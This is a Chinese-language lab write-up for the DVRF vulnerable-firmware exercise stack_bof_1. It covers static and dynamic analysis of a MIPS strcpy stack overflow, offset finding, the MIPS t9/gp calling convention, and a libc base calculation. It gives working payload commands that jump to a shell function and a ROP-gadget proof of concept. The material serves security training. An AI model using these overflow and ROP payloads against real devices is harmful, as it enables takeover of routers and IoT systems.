---
title: DVRF-stack_bof_1
tags: IOT
---
## 0x00 简介

DVRF是IOT固件漏洞靶场。

下载项目https://github.com/praetorian-inc/DVRF后，使用binwalk将固件提取出来，主要存在漏洞固件在 squashfs-root/pwnable/Intro 中。

![image-20220529171630947](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529171630947.png)

## 0x01 分析

这里主要看 stack_bof_1，通过file查看该文件属性：

![image-20220528185351298](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220528185351298.png)

可知这是一个32位的运行在MIPS中的ELF文件。

使用IDA pro 静态分析，可以看到存在一个危险函数 strcpy，且参数可控：

![image-20220528235550536](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220528235550536.png)

使用patternLocOffset.py生成300字节长度的随机字符串进行测试：

```
 python  patternLocOffset.py -c -l 300 -f offset
```

进行动态调试：

首先在装有QEMU的Linux虚拟机中，赋值qemu-mispel-static到squashfs-root目录中，通过-L参数指定根目录为本目录，-g指定远程调试端口启动该程序：

```
./qemu-mipsel-static -L ./ -g 23946 pwnable/Intro/stack_bof_01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
```

在IDA中进行远程调试，对参数的两个mov进行断点，F9运行到断点后，单步运行，查看a1值：

![image-20220529163926155](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529163926155.png)

可以看到a1值就是输入的参数值，执行完strcpy后，a0中被复制成a1相同的值。

------

**这里存在一个与x86或者x64不同的地方，MIPS的函数分为叶子函数和非叶子函数。在一个函数中，若没有调用其他函数，则此函数被称为叶子函数，反之则被称为非叶子函数。**

**叶子函数和非叶子函数在处理函数返回地址时有一个区别：**

- **叶子函数的返回地址是直接放在 ra 寄存器中**
- **非叶子函数把当前的返回地址暂时存放在栈上，再去调用函数内部的其他函数。会在代码中看到 lw $ra,xxx**

**因此在处理MIPS的栈溢出时，主要寻找非叶子函数的栈溢出，可以通过覆盖栈上保存的返回地址来控制程序执行流。当然叶子函数也不是完全没有可能做到栈溢出，如果在叶子函数上层是非叶子函数，若缓冲区足够大，可能可以覆盖到上层非叶子函数的返回地址。**

------

代码流程下对 lw $ra, 0xE0+var_s4($sp) 下断点，查看覆盖情况:

![image-20220529175235397](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529175235397.png)

RA被覆盖为 41386741，通过 patternLocOffset.py 搜索偏移：

![image-20220529175333000](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529175333000.png)

得到偏移为204。

程序在 dat_shell 函数中有system("/bin/sh -c")这个后门函数，因此只需要将返回地址覆盖为dat_shell地址，即可完成利用。

![image-20220529184259702](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529184259702.png)

dat_shell 地址为 0x00400950。

因此利用为：

```
python3 -c "print('a'*204+'\x50\x09\x40\x00')" > shellcode
./qemu-mipsel-static -L ./ -g 23945 pwnable/Intro/stack_bof_01 "`cat ~/Desktop/shellcode`"
```

![image-20220529193107798](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529193107798.png)

但是继续运行仍然出现crash：

![image-20220529193147750](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220529193147750.png)

这里先科普一个MIPS的知识点：

------

**MIPS的函数调用不像x86 call address就能实现，MIPS是使用t9寄存器保存函数地址，再通过jalr t9 实现函数跳转，如图：**

**![image-20220530130645070](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530130645070.png)**

**而t9和gp这两个寄存器也有关系。gp指向的是64k(2^16)大小的静态数据块的中间地址，函数内部会通过gp来进行数据寻址等操作，而当函数调用时，又可能会存在对gp进行设置的语句，而这里的设置，就是通过t9，如dat_shell中：**

**![image-20220530192823113](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530192823113.png)**

------

通过上面的描述，就能知道crash的原因了，由于缺少正常函数调用的过程，t9寄存器中的值并不是函数地址，也就导致对gp的设置出了问题，从而影响程序对数据和地址的访问。因此就有两个方案解决这个问题：

+ 直接跳过对gp的设置
+ 完成正常的函数调用流程

## 0x02 利用

### 2.1 跳过

这里要跳过对gp的设置，因此把地址改为0x0040095c：

![image-20220530194813527](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530194813527.png)

### 2.2 ROP

这里可以使用MIPSROP这个IDA pro插件去寻找可用的gadget：

```
mipsrop.find("")
```

但是并没有可用的gadget，因此通过readelf查看该文件有哪些动态链接库：

![image-20220530144911034](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530144911034.png)

IDA pro 导入libc.so.0，misprop寻找可用gadget，但是不知道为什么我找不到，只能找到这一条，：

![image-20220530172506979](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530172506979.png)

但实际上在00006B20 有合适的gadget：

![image-20220530172615139](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530172615139.png)

将栈上第一块地址空间复制给t9后，跳转到 t9对应的地址执行。

这里就涉及到一个问题，定位libc.so.0的基址。

通常来说，通过gdb进行调试后，可以执行vmmap来查看具体内存布局， 但此处报错：

![image-20220530200617096](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220530200617096.png)

这里尝试另一个方法，涉及到一个概念：动态链接。

------

GOT：Global Offset Table，全局偏移表，包含所有需要动态链接的外部函数的地址

PLT：Procedure Link Table，程序链接表，包含调用外部函数的跳转指令（跳转到GOT表中），以及初始化外部调用指令（用于链接器动态绑定dl_runtime_resolve）

通过动态链接， 我们可以调用外部共享库中的函数，而不需要将其编译在可执行文件中。PLT和GOT就一起完成了动态链接的过程。

libc.so就是包含了许多函数的动态链接库，因此确定libc.so基址的方法就是确定一个libc.so的函数，动态调试找到函数地址，减去静态分析时的偏移地址。

以memset函数举例，即 libc_baseAddress = memset_Address - memset_offset  

------

因此这里使用gdb进行调试

```
$ gdb-multiarch ./pwnable/Intro/stack_bof_01
pwndbg> set architecture mips
pwndbg> set endian little
pwndbg> target remote 127.0.0.1:23945
pwndbg> b memset
pwndbg> c
pwndbg> p &memset
```

![image-20220601235009958](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220601235009958.png)

再用IDA pro 打开 lib.so.0，找到memset:

![image-20220601235047517](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220601235047517.png)

因此得到libc.so.0的基地址为 0x7f700e10 - 0x0001be10 = 0x7f6e5000。

因此gadget地址为  0x7f6e5000 + 0x6b20 = 0x7f6ebb20

因此PoC为：

```
python -c "print 'a'*204+'\x20\xbb\x6e\x7f'+'\x50\x09\x40\x00'" > payload
```

![image-20220601235318097](https://ryze-1258886299.cos.ap-beijing.myqcloud.com/image-20220601235318097.png)